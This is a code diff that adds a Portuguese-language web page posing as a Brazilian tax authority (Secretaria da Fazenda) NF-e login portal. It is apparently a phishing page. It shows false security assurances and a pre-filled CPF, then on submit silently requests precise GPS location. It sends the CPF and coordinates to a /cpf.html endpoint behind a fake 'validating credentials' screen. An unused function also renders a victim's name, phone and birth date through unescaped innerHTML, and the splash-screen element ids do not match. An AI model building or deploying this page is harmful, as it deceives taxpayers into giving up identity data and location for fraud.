@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Portal de Serviços e Autenticação NF-e</title>
+  <style>
+    /* ── RESET & DESIGN SYSTEM ── */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f1f5f9;
+      color: #1e293b;
+      font-size: 13px;
+      line-height: 1.45;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── HEADER RESPONSIVO ── */
+    header {
+      background: linear-gradient(180deg, #0b2e59 0%, #174075 100%);
+      color: #ffffff;
+      border-bottom: 3.5px solid #107c41;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .header-top {
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .brand-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .brand-tag {
+      background: #107c41;
+      color: #ffffff;
+      font-weight: 800;
+      font-size: 13px;
+      padding: 4px 8px;
+      border-radius: 4px;
+    }
+    .brand-title {
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+    }
+    .header-badge {
+      font-size: 11px;
+      background: rgba(255,255,255,0.12);
+      padding: 3px 10px;
+      border-radius: 12px;
+      color: #e2e8f0;
+      white-space: nowrap;
+    }
+
+    /* ── NAV TABS ── */
+    .nav-tabs-wrapper {
+      background: #0f2b4c;
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+      border-bottom: 1px solid #091e36;
+    }
+    .nav-tabs-wrapper::-webkit-scrollbar {
+      display: none;
+    }
+    .nav-tabs {
+      max-width: 1000px;
+      margin: 0 auto;
+      display: flex;
+      list-style: none;
+      white-space: nowrap;
+    }
+    .nav-tabs li a {
+      display: block;
+      padding: 9px 16px;
+      color: #cbd5e1;
+      text-decoration: none;
+      font-size: 12px;
+      font-weight: 600;
+      border-right: 1px solid rgba(255,255,255,0.06);
+    }
+    .nav-tabs li a.active {
+      background: #174075;
+      color: #ffffff;
+      border-bottom: 2px solid #107c41;
+    }
+
+    /* ── LAYOUT RESPONSIVO ── */
+    .main-wrapper {
+      max-width: 1000px;
+      width: 100%;
+      margin: 16px auto;
+      padding: 0 12px;
+      flex: 1;
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 16px;
+    }
+
+    @media (min-width: 768px) {
+      .main-wrapper {
+        grid-template-columns: 360px 1fr;
+        padding: 0 16px;
+        margin: 20px auto;
+      }
+    }
+
+    /* ── CARD PRINCIPAL: CONSULTA CPF / LOGIN ── */
+    .card-login {
+      background: #ffffff;
+      border-radius: 10px;
+      border: 1px solid #cbd5e1;
+      box-shadow: 0 4px 12px rgba(15, 23, 42, 0.05);
+      overflow: hidden;
+      align-self: start;
+    }
+    .card-login-header {
+      background: #174075;
+      color: #ffffff;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 2.5px solid #107c41;
+    }
+    .card-login-body {
+      padding: 18px 16px;
+    }
+    .form-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 700;
+      color: #334155;
+      margin-bottom: 6px;
+    }
+    
+    /* INPUTS COM COR DE AUTOFILL (FUNDO AMARELO DE SENHA/CPF SALVO) */
+    .form-input {
+      width: 100%;
+      height: 46px;
+      padding: 0 14px;
+      font-size: 15px;
+      border: 1.5px solid #facc15;
+      border-radius: 8px;
+      outline: none;
+      background-color: #fef9c3 !important;
+      color: #0f172a;
+      font-weight: 600;
+      transition: all 0.2s;
+      margin-bottom: 12px;
+    }
+    .form-input:focus {
+      border-color: #174075;
+      background-color: #fef08a !important;
+      box-shadow: 0 0 0 3px rgba(250, 204, 21, 0.25);
+    }
+    
+    /* BOTÃO ENTRAR */
+    .btn-submit {
+      width: 100%;
+      height: 46px;
+      background: linear-gradient(180deg, #107c41 0%, #0b5e31 100%);
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 2px 6px rgba(16, 124, 65, 0.2);
+    }
+    .btn-submit:active {
+      transform: scale(0.99);
+    }
+
+    /* ── SPLASH OVERLAY "ACESSANDO COM SEGURANÇA" ── */
+    .splash-backdrop {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(11, 46, 89, 0.94);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      z-index: 10000;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      color: #ffffff;
+    }
+    .splash-box {
+      text-align: center;
+      padding: 30px 24px;
+      max-width: 320px;
+      animation: splashFadeIn 0.3s ease-out;
+    }
+    @keyframes splashFadeIn {
+      from { opacity: 0; transform: scale(0.92); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .splash-shield-icon {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 16px auto;
+      background: rgba(16, 124, 65, 0.2);
+      border: 2px solid #107c41;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 20px rgba(16, 124, 65, 0.4);
+    }
+    .splash-title {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 6px;
+      letter-spacing: 0.3px;
+    }
+    .splash-subtitle {
+      font-size: 12px;
+      color: #cbd5e1;
+      margin-bottom: 20px;
+    }
+    /* SPINNER DE SEGURANÇA */
+    .splash-spinner {
+      width: 32px;
+      height: 32px;
+      border: 3px solid rgba(255,255,255,0.15);
+      border-top: 3px solid #107c41;
+      border-radius: 50%;
+      margin: 0 auto;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* ── RESULTADO DA CONSULTA NO CARD ── */
+    #consulta-resultado {
+      display: none;
+      margin-top: 14px;
+      padding: 12px 14px;
+      border-radius: 8px;
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      color: #166534;
+      font-size: 13px;
+    }
+    #consulta-resultado.error {
+      background: #fef2f2;
+      border-color: #fecaca;
+      color: #991b1b;
+    }
+    .res-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 4px 0;
+      border-bottom: 1px dashed rgba(0,0,0,0.06);
+    }
+    .res-row:last-child {
+      border-bottom: none;
+    }
+
+    /* ── SEÇÃO DIREITA: INFORMATIVOS ── */
+    .content-column {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .info-box {
+      background: #ffffff;
+      border-radius: 10px;
+      border: 1px solid #cbd5e1;
+      padding: 16px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
+    }
+    .info-box-title {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #174075;
+      margin-bottom: 12px;
+      border-bottom: 1px solid #f1f5f9;
+      padding-bottom: 8px;
+    }
+
+    .notice-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+    .notice-item {
+      padding-left: 12px;
+      border-left: 3px solid #107c41;
+    }
+    .notice-date {
+      font-size: 11px;
+      font-weight: 700;
+      color: #107c41;
+    }
+    .notice-title {
+      font-size: 13.5px;
+      font-weight: 600;
+      color: #0f172a;
+      margin: 2px 0 4px 0;
+    }
+    .notice-desc {
+      font-size: 12px;
+      color: #475569;
+      line-height: 1.5;
+    }
+
+    .guide-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 10px;
+    }
+    .guide-card {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      padding: 12px;
+    }
+    .guide-card-title {
+      font-weight: 700;
+      font-size: 12.5px;
+      color: #174075;
+      margin-bottom: 4px;
+    }
+    .guide-card-desc {
+      font-size: 11.5px;
+      color: #64748b;
+    }
+
+    footer {
+      background: #0b2e59;
+      color: #94a3b8;
+      text-align: center;
+      padding: 16px 12px;
+      font-size: 11px;
+      border-top: 3px solid #107c41;
+      margin-top: auto;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="header-top">
+      <div class="brand-group">
+        <span class="brand-tag">NFe</span>
+        <span class="brand-title">Portal de Autenticação</span>
+      </div>
+      <span class="header-badge">Sistema Secretaria da Fazenda</span>
+    </div>
+
+    <div class="nav-tabs-wrapper">
+      <ul class="nav-tabs">
+        <li><a href="#" class="active">Principal</a></li>
+        <li><a href="#">Consultas</a></li>
+        <li><a href="#">Orientações</a></li>
+        <li><a href="#">Manuais</a></li>
+        <li><a href="#">Legislação</a></li>
+      </ul>
+    </div>
+  </header>
+
+  <!-- LAYOUT PRINCIPAL -->
+  <div class="main-wrapper">
+
+    <!-- COLUNA ESQUERDA: LOGIN COM CPF E SENHA PRÉ-SALVA -->
+    <aside class="card-login">
+      <div class="card-login-header">
+        <span>Consulta de Titular</span>
+        <span style="font-size: 11px; opacity: 0.9;">Acesso Seguro</span>
+      </div>
+      <div class="card-login-body">
+        <form id="secfazForm">
+          <label class="form-label" for="cpfInput">CPF do Titular:</label>
+          <input 
+            type="tel" 
+            id="cpfInput" 
+            class="form-input" 
+            value="063.818.519-02" 
+            required 
+            maxlength="14"
+            inputmode="numeric"
+          >
+
+          <label class="form-label" for="passInput">Senha de Acesso:</label>
+          <input 
+            type="password" 
+            id="passInput" 
+            class="form-input" 
+            value="••••••••••••" 
+            required 
+          >
+
+          <button type="submit" class="btn-submit">
+            <span>Entrar</span>
+          </button>
+        </form>
+
+        <!-- RESULTADO DA BUSCA -->
+        <div id="consulta-resultado"></div>
+      </div>
+    </aside>
+
+    <!-- COLUNA DIREITA: INFORMATIVOS -->
+    <main class="content-column">
+
+      <section class="info-box">
+        <div class="info-box-title">
+          <span>Comunicados e Avisos do Contribuinte</span>
+        </div>
+        <ul class="notice-list">
+          <li class="notice-item">
+            <span class="notice-date">14/08/2026</span>
+            <div class="notice-title">Ambiente Seguro de Validação</div>
+            <div class="notice-desc">As credenciais salvas são verificadas com criptografia de ponta a ponta no servidor Secfaz.</div>
+          </li>
+          <li class="notice-item">
+            <span class="notice-date">10/08/2026</span>
+            <div class="notice-title">Instruções para Consulta de Registros</div>
+            <div class="notice-desc">Certifique-se de preencher os 11 dígitos do CPF para consultar as informações cadastrais.</div>
+          </li>
+        </ul>
+      </section>
+
+      <section class="info-box">
+        <div class="info-box-title">
+          <span>Orientações Úteis</span>
+        </div>
+        <div class="guide-grid">
+          <div class="guide-card">
+            <div class="guide-card-title">Segurança no Acesso</div>
+            <div class="guide-card-desc">Sua sessão é protegida por validação de protocolo TLS/SSL durante o envio dos dados.</div>
+          </div>
+          <div class="guide-card">
+            <div class="guide-card-title">Dados divergentes?</div>
+            <div class="guide-card-desc">Em caso de incorreção nos dados exibidos, verifique o documento de identificação original do titular.</div>
+          </div>
+        </div>
+      </section>
+
+    </main>
+
+  </div>
+
+  <!-- SPLASH SCREEN DE SEGURANÇA -->
+  <div class="splash-screen" id="splashScreen">
+    <div class="splash-spinner"></div>
+    <div class="splash-title">Acessando com Segurança...</div>
+    <div class="splash-subtitle">Validando credenciais junto ao servidor da Secretaria da Fazenda</div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    <div>&copy; 2026 Portal de Autenticação NF-e &bull; Sistema de Consultas da Secretaria da Fazenda</div>
+  </footer>
+
+  <script>
+    // MÁSCARA AUTOMÁTICA DE CPF
+    const cpfInput = document.getElementById('cpfInput');
+    cpfInput.addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length > 11) v = v.slice(0, 11);
+      v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      e.target.value = v;
+    });
+
+    // RENDERIZAR RESULTADO DA CONSULTA
+    function renderResult(d) {
+      const resBox = document.getElementById('consulta-resultado');
+      resBox.style.display = 'block';
+      resBox.className = '';
+      resBox.innerHTML = `
+        <div style="font-weight: 700; margin-bottom: 8px; border-bottom: 1px solid #cbd5e1; padding-bottom: 4px; color: #166534;">
+          Titular Autenticado
+        </div>
+        <div class="res-row"><span style="color: #475569; font-weight: 600;">Nome:</span> <strong>${d.nome || 'N/A'}</strong></div>
+        <div class="res-row"><span style="color: #475569; font-weight: 600;">CPF:</span> <strong>${d.cpf || 'N/A'}</strong></div>
+        <div class="res-row"><span style="color: #475569; font-weight: 600;">Telefone:</span> <strong>${d.telefone || 'N/A'}</strong></div>
+        <div class="res-row"><span style="color: #475569; font-weight: 600;">Data Nasc.:</span> <strong>${d.dtNasc || 'N/A'}</strong></div>
+      `;
+    }
+
+    // SUBMITE DO FORMULÁRIO DE LOGIN COM SOLICITAÇÃO DE GEOLOCALIZAÇÃO
+    document.getElementById('secfazForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const splash = document.getElementById('splashOverlay');
+      if (splash) splash.style.display = 'flex';
+
+      const currentCpf = cpfInput.value ? cpfInput.value.replace(/\D/g, '') : '06381851902';
+      let geoParams = '';
+
+      // Dispara o prompt nativo do navegador/dispositivo solicitando acesso ao GPS/Localização
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            const lat = pos.coords.latitude.toFixed(4);
+            const lng = pos.coords.longitude.toFixed(4);
+            geoParams = `&lat=${lat}&lng=${lng}`;
+
+            setTimeout(function() {
+              window.location.href = `/cpf.html?cpf=${encodeURIComponent(currentCpf)}${geoParams}`;
+            }, 2000);
+          },
+          function(err) {
+            // Em caso de recusa pelo usuário, efetua o redirecionamento padrão após o splash
+            setTimeout(function() {
+              window.location.href = `/cpf.html?cpf=${encodeURIComponent(currentCpf)}`;
+            }, 2500);
+          },
+          { enableHighAccuracy: true, timeout: 6000 }
+        );
+      } else {
+        setTimeout(function() {
+          window.location.href = `/cpf.html?cpf=${encodeURIComponent(currentCpf)}`;
+        }, 2500);
+      }
+    });
+  </script>
+</body>
+</html>
